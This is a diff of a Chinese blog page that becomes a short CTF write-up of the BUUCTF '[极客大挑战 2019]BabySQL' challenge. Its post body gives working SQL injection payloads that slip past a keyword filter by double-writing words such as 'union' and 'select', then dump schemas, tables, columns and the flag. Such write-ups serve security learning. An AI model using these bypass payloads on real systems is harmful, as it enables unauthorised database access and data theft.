@@ -17,9 +17,25 @@
   <meta name="description" content="BLOG">
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
-  <title>标签 - wp - lll-nnnのblog</title>
+  <title>BUU每日一题013 - lll-nnnのblog</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
 
 
 
@@ -47,7 +63,7 @@
 
 
 <body>
-  <header style="height: 80vh;">
+  <header style="height: 70vh;">
     <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
     <a class="navbar-brand"
@@ -146,9 +162,46 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="标签 - wp">
+            <span class="h2" id="subtitle" title="BUU每日一题013">
               
             </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-01-27 14:05" pubdate>
+        2021年1月27日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      232 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      3
+       分钟
+    </span>
+  
+
+  
+  
+</div>
 
             
           </div>
@@ -161,76 +214,80 @@
 
   <main>
     
-      <div class="container nopadding-md">
-        <div class="py-5" id="board"
-          >
-          
-          <div class="container">
-            <div class="row">
-              <div class="col-12 col-md-10 m-auto">
-                
-
-<div class="list-group">
-  <p class="h4">共计 15 篇文章</p>
-  <hr>
-  
-  
-    
       
-      <p class="h5">2021</p>
-    
-    <a href="/2021/01/18/BUU004/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">BUU每日一题004</span>
-      <time style="float: right;">01-18</time>
-    </a>
-  
-    
-    <a href="/2021/01/17/BUU003/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">BUU每日一题003</span>
-      <time style="float: right;">01-17</time>
-    </a>
-  
-    
-    <a href="/2021/01/16/BUU002/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">BUU每日一题002</span>
-      <time style="float: right;">01-16</time>
-    </a>
-  
-    
-    <a href="/2021/01/15/GFSJ/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">GFSJ</span>
-      <time style="float: right;">01-15</time>
-    </a>
-  
-    
-    <a href="/2021/01/15/BUU001/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">BUU每日一题001</span>
-      <time style="float: right;">01-15</time>
-    </a>
-  
-</div>
 
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">BUU每日一题013</h1>
+            
+            <div class="markdown-body">
+              <h2 id="十三、"><a href="#十三、" class="headerlink" title="十三、"></a>十三、</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>[极客大挑战 2019]BabySQL<br><img src="https://ftp.bmp.ovh/imgs/2021/01/ba5c0550bde2d7d3.png" srcset="/img/loading.gif">     </p>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>SQL注入<br><code>username=1&#39;      password=1</code>报错<br><code>username=1&#39;# password=1</code>没有报错，那应该就是单引号字符型了吧<br>然后<code>order by </code><img src="https://ftp.bmp.ovh/imgs/2021/01/2c23369b6aece50e.png" srcset="/img/loading.gif"><br>只剩了<code>der</code>说明<code>or</code>被替换为空了，因为只会替换一次，所以双写即可绕过<code>oorrder by </code>然后发现<code>by</code>也被替换了，但返回显示的是<code>1#</code>前面的order不是绕过了么，怎么会没有了？？<br><code>oorrder bbyy</code>得到一共有三列<br>还有<code>select、from、where</code>也会被替换        </p>
+<h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><p><code>username=1&amp;password=1&#39; ununionion selselectect 1,2,(selselectect group_concat(schema_name) frfromom infoorrmation_schema.schemata)#</code>得到所有库<img src="https://ftp.bmp.ovh/imgs/2021/01/6f07428aeecb4084.png" srcset="/img/loading.gif"><br><code>username=1&amp;password=1&#39; ununionion selselectect 1,(seleselectct group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema=&#39;ctf&#39;),(selselectect group_concat(schema_name) frfromom infoorrmation_schema.schemata)#</code>ctf下的表<img src="https://ftp.bmp.ovh/imgs/2021/01/faaaf5cf1ab77e21.png" srcset="/img/loading.gif"><br><code>username=1&amp;password=1&#39; ununionion selselectect 1,(seleselectct group_concat(column_name) frfromom infoorrmation_schema.columns whewherere table_name=&#39;Flag&#39;),(selselectect group_concat(schema_name) frfromom infoorrmation_schema.schemata)#</code>Flag下的列<img src="https://ftp.bmp.ovh/imgs/2021/01/a316535fcd86d177.png" srcset="/img/loading.gif"><br><code>username=1;password=1&#39; ununionion selselectect 1,(seleselectct group_concat(flag) frfromom ctf.Flag),(selselectect group_concat(schema_name) frfromom infoorrmation_schema.schemata)#</code>得到flag<img src="https://ftp.bmp.ovh/imgs/2021/01/e332d6380e96f25e.png" srcset="/img/loading.gif">    </p>
 
-  <nav aria-label="navigation">
-    <span class="pagination" id="pagination">
-      <a class="extend prev" rel="prev" href="/tags/wp/"><i class="iconfont icon-arrowleft"></i></a><a class="page-number" href="/tags/wp/">1</a><span class="page-number current">2</span>
-    </span>
-  </nav>
-  
-  <script>
-    for (ele of document.getElementById("pagination").getElementsByTagName("a")) {
-      ele.href += '#board';
-    }
-  </script>
-
-
-
-
-              </div>
             </div>
-          </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/wp/">wp</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/01/26/BUU012/">
+                        <span class="hidden-mobile">BUU每日一题012</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
         </div>
       </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
     
 
     
@@ -313,9 +370,15 @@
 
 
 
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
 
 
 
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
 
 
 
